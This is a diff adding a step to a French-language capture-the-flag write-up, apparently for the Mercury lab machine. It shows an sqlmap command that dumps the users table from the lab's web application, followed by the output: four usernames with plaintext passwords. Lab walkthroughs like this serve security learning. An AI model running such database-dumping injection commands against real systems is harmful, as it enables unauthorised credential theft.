@@ -258,3 +258,18 @@ Database: mercury
 +-------+
 ```
 
+La commande ```sqlmap http://192.168.56.103:8080/mercuryfacts/1 -D mercury -T users --dump``` me donne :
+```
+Database: mercury
+Table: users
+[4 entries]
++----+-------------------------------+-----------+
+| id | password                      | username  |
++----+-------------------------------+-----------+
+| 1  | johnny1987                    | john      |
+| 2  | lovemykids111                 | laura     |
+| 3  | lovemybeer111                 | sam       |
+| 4  | mercuryisthesizeof0.056Earths | webmaster |
++----+-------------------------------+-----------+
+```
+
